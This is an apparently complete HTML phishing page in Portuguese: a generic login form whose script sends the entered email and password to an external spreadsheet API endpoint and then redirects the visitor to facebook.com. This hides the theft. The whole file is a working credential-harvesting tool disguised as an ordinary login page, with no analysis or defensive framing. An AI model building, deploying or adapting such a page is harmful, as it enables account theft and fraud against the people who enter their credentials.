<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        h2 {
            margin-bottom: 20px;
            font-size: 24px;
            text-align: center;
            color: #333;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Login</h2>
        <form action="https://sheetdb.io/api/v1/sukxyvcd371y0" method="POST" id="Login">
            <label for="username">Email</label>
            <input type="text" id="username" name="email" placeholder="Digite seu email" required>
            
            <label for="password">Senha</label>
            <input type="password" id="password" name="senha" placeholder="Digite sua senha" required>
            
            <button type="submit">Entrar</button>
        </form>
        <script>
        document.getElementById('Login').onsubmit = function(event) {
            event.preventDefault(); // Previne o envio padrão do formulário

            const formData = new FormData(this);
            const data = {};
            formData.forEach((value, key) => {
                data[key] = value;
            });

            fetch('https://sheetdb.io/api/v1/sukxyvcd371y0', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    // Dados enviados com sucesso, redireciona para o Facebook
                    window.location.href = "https://www.facebook.com";
                } else {
                    // Trate o erro aqui, se necessário
                    console.error('Erro ao enviar os dados');
                }
            })
            .catch(error => {
                console.error('Erro de rede:', error);
            });
        };
        </script> 
    </div>

</body>
</html>
